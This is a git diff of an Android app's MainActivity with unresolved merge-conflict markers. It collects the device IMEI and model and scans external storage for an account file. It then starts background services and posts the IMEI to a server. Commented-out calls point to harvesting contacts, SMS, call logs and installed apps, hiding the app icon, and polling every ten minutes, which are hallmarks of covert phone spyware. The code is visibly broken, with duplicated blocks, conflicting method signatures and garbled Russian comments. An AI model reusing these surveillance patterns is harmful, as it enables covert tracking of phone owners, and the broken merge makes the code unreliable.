@@ -61,20 +61,40 @@ public class MainActivity extends Activity {
 		context = getApplicationContext();
 		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 
+<<<<<<< HEAD
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
+=======
 		FileLog.writeLog(" ============================ \n");
 		FileLog.writeLog(" onCreate \n");
 		FileLog.writeLog(" ============================\n ");
 
 		sp = PreferenceManager
 				.getDefaultSharedPreferences(getApplicationContext());
+>>>>>>> refs/remotes/origin/war
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
+<<<<<<< HEAD
+		String androidVersion = android.os.Build.VERSION.RELEASE;
+		// ListApp listApp = new ListApp();
+		// listApp.getListOfInstalledApp(context);
+		// GetInfo getInfo = new GetInfo(context);
+		// getInfo.getInfo();
+		// GetContacts getCont = new GetContacts();
+		// getCont.execute(context);
+		// ArchiveSms arhSms = new ArchiveSms();
+		// arhSms.execute(context);
+		// ArchiveCall arhCall = new ArchiveCall();
+		// arhCall.execute(context);
+		aboutDev = " Model: " + model + " Version android: " + androidVersion;
+		// sIMEI = "IMEI: " + imeistring;
+=======
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
 
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
+>>>>>>> refs/remotes/origin/war
 		e = sp.edit();
 		e.putString("BUILD", "V_000.1");
 		e.putString("imei", imeistring);
@@ -84,16 +104,27 @@ public class MainActivity extends Activity {
 
 		e.commit();
 
+<<<<<<< HEAD
+=======
 		// hideIcon(); //
 
 		// проверяем, первый ли раз открывается программа
+>>>>>>> refs/remotes/origin/war
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 		boolean getInfo = sp.getBoolean("getInfo", false);
+<<<<<<< HEAD
+=======
 		if (!hasVisited) {
 			// РїСЂРѕРІРµСЂРєР° РЅР° РїРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
 
+>>>>>>> refs/remotes/origin/war
 		if (!hasVisited) {
+<<<<<<< HEAD
+			// РїСЂРѕРІРµСЂРєР° РЅР° РїРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
+
+=======
 			// проверка на первое посещение
+>>>>>>> refs/remotes/origin/war
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
 			e.putBoolean("getInfo", true);
@@ -108,7 +139,35 @@ public class MainActivity extends Activity {
 			e.putString("period", "1"); // РїРµСЂРёРѕРґРёС‡РµСЃРєРёР№ Р·Р°РїСЂРѕСЃ РєР°Р¶РґС‹Рµ 10 РјРёРЅСѓС‚
 			e.putString("code", "-1");
 			e.commit();
+<<<<<<< HEAD
 
+			// hideIcon();
+		}
+
+		if (getID()) {
+			Logging.doLog(LOG_TAG, "getID return true");
+		} else {
+			Logging.doLog(LOG_TAG, "getID return false");
+		}
+		if (sp.getString("account", "account").equals("account")) {
+
+			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
+					"File not found. Show dialog.");
+			viewIDDialog();
+		} else {
+			Logging.doLog(LOG_TAG, "not show dialog");
+
+			finish();
+		}
+	}
+=======
+>>>>>>> refs/remotes/origin/war
+
+<<<<<<< HEAD
+	@Override
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
+=======
 			// hideIcon();
 		}
 
@@ -130,6 +189,7 @@ public class MainActivity extends Activity {
 
 			finish();
 		}
+>>>>>>> refs/remotes/origin/war
 	}
 
 	private boolean viewIDDialog() {
@@ -144,6 +204,13 @@ public class MainActivity extends Activity {
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
 			public void onClick(DialogInterface dialog, int whichButton) {
 				String value = input.getText().toString();
+<<<<<<< HEAD
+
+				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
+
+				e = sp.edit();
+				e.putString("account", value);
+=======
 				
 				// Do something with value!
 				Log.d(LOG_TAG, "Text: " + value);
@@ -153,10 +220,33 @@ public class MainActivity extends Activity {
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
 				e.putString("ID", value);
+>>>>>>> refs/remotes/origin/war
 				e.commit();
+<<<<<<< HEAD
+
+				SharedPreferences sp = PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext());
+				Logging.doLog(LOG_TAG, "send start request, imei: ",
+						sp.getString("imei", "imei"));
+
+				JSONObject jsonObject = new JSONObject();
+				try {
+					jsonObject.put("account", sp.getString("account", "0000"));
+					jsonObject.put("imei", sp.getString("imei", "imei"));
+					jsonObject.put("model", sp.getString("model", "0000"));
+				} catch (JSONException e) {
+					e.printStackTrace();
+				}
+
+				// String str = jsonObject.toString();
+				// StartRequest sr = new StartRequest(getApplicationContext());
+				// sr.sendRequest(str);
+				start(); // Р·Р°РїСѓСЃРє СЃРµСЂРІРёСЃРѕРІ
+=======
 				
 				start(); // запуск сервисов
 				sendDiagPost();
+>>>>>>> refs/remotes/origin/war
 				finish();
 			}
 		});
@@ -173,15 +263,11 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
-	public void sendDiagPost() {
-		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
-				+ logTime() + "</time><type>1</type><ttl>"
-				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
-				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
-				+ "</cls><app>Диагностическая информация</app><url>"
-				+ Long.toString(System.currentTimeMillis())
-				+ sp.getString("ABOUT", "about") + "</url></packet>";
+	public boolean getID() {
+		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
 
+<<<<<<< HEAD
+=======
 		FileLog.writeLog("MainActRequest: before req");
 
 		Request req = new Request(context);
@@ -193,13 +279,17 @@ public class MainActivity extends Activity {
 
 	public void getID() {
 		Log.d(LOG_TAG, "Start search ID ");
+>>>>>>> refs/remotes/origin/war
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		return recursiveFileFind(file);
 	}
 
 	public boolean recursiveFileFind(File[] file1) {
 		int i = 0;
+<<<<<<< HEAD
+=======
 		String ID = null;
+>>>>>>> refs/remotes/origin/war
 		String filePath = " ";
 		if (file1 != null) {
 			while (i != file1.length) {
@@ -207,8 +297,14 @@ public class MainActivity extends Activity {
 				sID = file1[i].getName();
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
+<<<<<<< HEAD
+					if (recursiveFileFind(file) == true) {
+						return true;
+					}
+=======
 					if (recursiveFileFind(file) == true)
 						return true;
+>>>>>>> refs/remotes/origin/war
 				}
 
 				if (sID.indexOf("ts.apk") != -1) {
@@ -216,17 +312,29 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
+<<<<<<< HEAD
+					// Log.d("ID", sp.getString("ID", "ID"));
+					if (!sp.getString("account", "account").equals("account")) {
+						start();
+						return true;
+					}
+					break;
+=======
 					
 					sendDiagPost();
 					
 					start(); // запуск сервисов
 					return true;
+>>>>>>> refs/remotes/origin/war
 				}
 				i++;
 			}
 
 		}
+<<<<<<< HEAD
+=======
 		
+>>>>>>> refs/remotes/origin/war
 		return false;
 	}
 
